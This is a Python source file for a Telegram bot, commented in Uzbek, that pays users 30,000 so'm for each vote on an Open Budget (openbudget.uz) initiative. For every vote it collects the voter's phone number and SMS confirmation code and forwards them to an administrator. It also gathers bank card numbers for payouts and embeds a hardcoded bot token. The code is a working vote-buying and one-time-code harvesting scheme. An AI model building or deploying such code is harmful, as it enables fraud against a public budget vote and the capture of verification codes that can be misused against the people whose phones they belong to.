import telebot
import sqlite3
import threading
import os
from flask import Flask
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo

# ================= 1. BOT SOZLAMALARI =================
TOKEN = '8009128157:AAE4i3zL0QU9s5YRF7hBr-NCdFc0ZHCK4_s'
ADMIN_ID = '7356340513'
LOYIHA_HAVOLASI = "https://openbudget.uz/boards/initiatives/initiative/55/74807204-f411-47f9-b7c0-e1fd650f9be2" # Ochiq byudjetdagi loyihangiz havolasi

# Pul hisob-kitobi uchun sozlamalar
TOLOV_SUMMASI = 30000  
TOLOV_MATNI = "30 000 so'm" 

bot = telebot.TeleBot(TOKEN)

# ================= 2. MA'LUMOTLAR BAZASI =================
conn = sqlite3.connect('openbudget.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS votes (phone TEXT PRIMARY KEY, user_id INTEGER, status TEXT)''')
conn.commit()
user_states = {}

# ================= 3. ASOSIY MENYU TUGMALARI =================
def main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("📥 Ovoz berish"))
    markup.row(KeyboardButton("💳 Hamyon"), KeyboardButton("📱 Ovoz bergan raqamlarim"))
    return markup

# ================= 4. BOT MANTIQI =================
@bot.message_handler(commands=['start'])
def start_message(message):
    chat_id = message.chat.id
    user_states.pop(chat_id, None) 
    
    bot.send_message(
        chat_id, 
        "👋 Salom! Ochiq byudjet ovoz yig'ish botiga xush kelibsiz.\n\n"
        f"💰 **Har bir tasdiqlangan ovoz uchun to'lov: {TOLOV_MATNI}**\n"
        "💳 _Pulni yechib olish uchun ovoz yig'ishingiz kerak._\n\n"
        "👇 Pastdagi menyudan kerakli bo'limni tanlang:", 
        reply_markup=main_menu(),
        parse_mode="Markdown"
    )

# --------- MENYUDAGI TUGMALAR ---------
@bot.message_handler(func=lambda message: message.text in ["📥 Ovoz berish", "💳 Hamyon", "📱 Ovoz bergan raqamlarim"])
def handle_menu(message):
    chat_id = message.chat.id
    text = message.text
    user_states.pop(chat_id, None) 
    
    # 1. OVOZ BERISH BO'LIMI
    if text == "📥 Ovoz berish":
        msg = f"👉 Avval ovoz bermoqchi bo'lgan **telefon raqamingizni kiriting** (Masalan: +998901234567):"
        bot.send_message(chat_id, msg, parse_mode="Markdown")
        user_states[chat_id] = {'step': 'waiting_phone'}
        
    # 2. HAMYON BO'LIMI
    elif text == "💳 Hamyon":
        cursor.execute("SELECT COUNT(*) FROM votes WHERE user_id=? AND status='completed'", (chat_id,))
        count = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM votes WHERE user_id=? AND status='paid'", (chat_id,))
        paid_count = cursor.fetchone()[0]
        
        total_money = count * TOLOV_SUMMASI
        pul_formati = f"{total_money:,}".replace(',', ' ') 
        
        msg = (
            f"💳 **Sizning hamyoningiz:**\n\n"
            f"✅ Tasdiqlangan (yangi) ovozlar: **{count} ta**\n"
            f"💰 Hamyondagi jami pul: **{pul_formati} so'm**\n"
            f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
            f"💸 Avval to'lab berilgan ovozlar: {paid_count} ta"
        )
        
        if count >= 2:
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("💸 Pulni yechib olish", callback_data="withdraw"))
            bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=markup)
        else:
            msg += "\n\n*(Pulni kartaga o'tkazish uchun hamyoningizda kamida 2 ta ovoz bo'lishi kerak)*"
            bot.send_message(chat_id, msg, parse_mode="Markdown")
            
    # 3. RAQAMLAR BO'LIMI
    elif text == "📱 Ovoz bergan raqamlarim":
        cursor.execute("SELECT phone, status FROM votes WHERE user_id=?", (chat_id,))
        numbers = cursor.fetchall()
        
        if not numbers:
            bot.send_message(chat_id, "Siz hali hech qanday raqamdan ovoz bermagansiz.")
        else:
            num_list = ""
            for n in numbers:
                holat = "To'langan ✅" if n[1] == 'paid' else "Hamyonda 🕒"
                num_list += f"📞 {n[0]} - _{holat}_\n"
                
            bot.send_message(chat_id, f"**Siz kiritgan raqamlar ro'yxati:**\n\n{num_list}", parse_mode="Markdown")

# --------- PUL YECHISH JARAYONI ---------
@bot.callback_query_handler(func=lambda call: call.data == 'withdraw')
def handle_withdraw(call):
    chat_id = call.message.chat.id
    
    cursor.execute("SELECT COUNT(*) FROM votes WHERE user_id=? AND status='completed'", (chat_id,))
    count = cursor.fetchone()[0]
    
    if count >= 2:
        bot.delete_message(chat_id, call.message.message_id) 
        bot.send_message(chat_id, "💳 Iltimos, pulni tashlab berishimiz uchun **plastik karta raqamingizni** yozib yuboring:")
        user_states[chat_id] = {'step': 'waiting_withdraw_card', 'count': count}
    else:
        bot.answer_callback_query(call.id, "Sizda yetarli ovoz yo'q!", show_alert=True)
        
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda message: message.chat.id in user_states and user_states[message.chat.id].get('step') == 'waiting_withdraw_card')
def handle_withdraw_card(message):
    chat_id = message.chat.id
    card_info = message.text
    count = user_states[chat_id].get('count')
    
    total_money = count * TOLOV_SUMMASI
    pul_formati = f"{total_money:,}".replace(',', ' ')
    
    cursor.execute("UPDATE votes SET status='paid' WHERE user_id=? AND status='completed'", (chat_id,))
    conn.commit()
    
    username = f"@{message.from_user.username}" if message.from_user.username else f"ID: {chat_id}"
    admin_msg = (
        f"💸 **YANGI TO'LOV SO'ROVI KELDI!**\n\n"
        f"👤 Foydalanuvchi: {username}\n"
        f"✅ Tasdiqlangan ovozlar: **{count} ta**\n"
        f"💰 To'lanishi kerak: **{pul_formati} so'm**\n"
        f"💳 Karta raqami: `{card_info}`\n\n"
        f"Iltimos, pulni o'tkazing."
    )
    bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
    
    bot.send_message(
        chat_id, 
        "✅ **So'rovingiz adminga yuborildi!** Tez orada pul kartangizga tushirib beriladi.\n\n"
        "🔄 _Sizning hamyoningiz balansi Nol (0) holatiga tushirildi._ Yana ovoz yig'ishda davom etishingiz mumkin!", 
        parse_mode="Markdown"
    )
    user_states.pop(chat_id, None)

# --------- TELEFON VA WEB APP (OCHIQ BYUDJET) ORQALI OVOZ BERISH ---------
@bot.message_handler(func=lambda message: message.chat.id in user_states and user_states[message.chat.id].get('step') == 'waiting_phone')
def handle_phone(message):
    chat_id = message.chat.id
    phone = message.text.strip()
    
    cursor.execute("SELECT * FROM votes WHERE phone=?", (phone,))
    if cursor.fetchone():
        bot.send_message(chat_id, "❌ **Bu telefon raqamdan allaqachon ovoz berilgan!**\nBoshqa yangi raqam kiritish uchun menyudan '📥 Ovoz berish' ni bosing.")
        user_states.pop(chat_id, None)
    else:
        user_states[chat_id] = {'step': 'waiting_sms_code', 'phone': phone}
        
        # Telegram ichida ochiladigan Web App tugmasini yaratamiz
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🌐 Ochiq byudjetni ochish", web_app=WebAppInfo(url=LOYIHA_HAVOLASI)))
        
        text = (
            f"✅ Raqam qabul qilindi: {phone}\n\n"
            f"1️⃣ Pastdagi tugmani bosing (sayt to'g'ridan-to'g'ri Telegram ichida ochiladi):\n"
            f"2️⃣ Ovoz bergandan keyin telefoningizga kelgan **SMS kodni** shu yerga yuboring:"
        )
        bot.send_message(chat_id, text, reply_markup=markup)

@bot.message_handler(func=lambda message: message.chat.id in user_states and user_states[message.chat.id].get('step') == 'waiting_sms_code')
def handle_sms_code(message):
    chat_id = message.chat.id
    sms_code = message.text.strip()
    state_data = user_states.get(chat_id)
    phone = state_data.get('phone')

    try:
        cursor.execute("INSERT INTO votes (phone, user_id, status) VALUES (?, ?, ?)", (phone, chat_id, 'completed'))
        conn.commit()
    except sqlite3.IntegrityError:
        bot.send_message(chat_id, "❌ Xatolik: Bu raqam allaqachon ro'yxatdan o'tgan!")
        return user_states.pop(chat_id, None)

    username = f"@{message.from_user.username}" if message.from_user.username else f"ID: {chat_id}"
    admin_text = (
        f"🔔 **Yangi SMS KOD keldi!**\n"
        f"📱 Raqam: `{phone}`\n"
        f"🔢 SMS kod: `{sms_code}`\n"
        f"👤 Foydalanuvchi: {username}\n"
        f"*(Bu ovoz foydalanuvchining hamyoniga tushdi)*"
    )
    bot.send_message(ADMIN_ID, admin_text, parse_mode="Markdown")

    bot.send_message(
        chat_id, 
        f"🎉 **Tabriklaymiz!** SMS kod qabul qilindi va pul **Hamyoningizga** tushdi.\n\n"
        f"Menyudan '💳 Hamyon' bo'limiga o'tib, balansingizni ko'rishingiz mumkin.",
        parse_mode="Markdown"
    )
    user_states.pop(chat_id, None)

# ================= 5. RENDER UCHUN SOXTA VEB-SERVER =================
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot muvaffaqiyatli ishlayapti! (Render serverida)"

def run_bot():
    bot.polling(none_stop=True)

if __name__ == '__main__':
    threading.Thread(target=run_bot).start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host="0.0.0.0", port=port)
